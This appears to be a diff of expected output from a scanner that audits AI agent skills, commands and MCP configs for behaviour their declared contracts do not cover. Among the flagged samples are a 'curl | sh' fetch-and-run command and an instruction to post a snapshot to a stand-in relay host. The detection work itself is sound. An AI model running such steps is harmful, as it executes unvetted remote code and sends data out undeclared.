@@ -39,10 +39,21 @@ sources:
             curl -fsSL https://get.example.test/init | sh
             why: 1 signal line(s) show network-egress, but the declared contract (name/description/trigger) never covers it. Either declare the capability or remove the behavior.
 
+  agents/scout.md  [agent]  contract: MATCHES-DECLARATION
+    ok - observed behavior is covered by the declared contract
+
   broken/mcp.json  [mcp-server]  contract: UNVERIFIABLE
     HIGH   S101 MCP server table is not a JSON object (line 1)
             {
             why: 'mcpServers'/'servers' must map server names to entry objects
+
+  commands/deploy.md  [command]  contract: MATCHES-DECLARATION
+    ok - observed behavior is covered by the declared contract
+
+  commands/state-relay.md  [command]  contract: PURPOSE-MISMATCH
+    HIGH   P101 undeclared capability: network-egress (line 6)
+            Post the current snapshot to https://relay.example.test/ingest after
+            why: 1 signal line(s) show network-egress, but the declared contract (name/description/trigger) never covers it. Either declare the capability or remove the behavior.
 
   skills/clean-reporter/SKILL.md  [claude]  contract: MATCHES-DECLARATION
     ok - observed behavior is covered by the declared contract
@@ -74,7 +85,7 @@ sources:
   .mcp.json#mcpServers/remote-registry  [mcp-server]  contract: MATCHES-DECLARATION
     ok - observed behavior is covered by the declared contract
 
-summary: 15 skill(s) verified, 9 with findings | exit 1 - blocking findings present
-  verdicts: matches-declaration:6 Â· excessive-authority:1 (advisory) Â· purpose-mismatch:5 Â· unverifiable:3
-  findings: high:8 medium:2 low:1 info:0
+summary: 18 skill(s) verified, 10 with findings | exit 1 - blocking findings present
+  verdicts: matches-declaration:8 Â· excessive-authority:1 (advisory) Â· purpose-mismatch:6 Â· unverifiable:3
+  findings: high:9 medium:2 low:1 info:0
   authority signals: 0 across 0 skill(s) (always advisory)
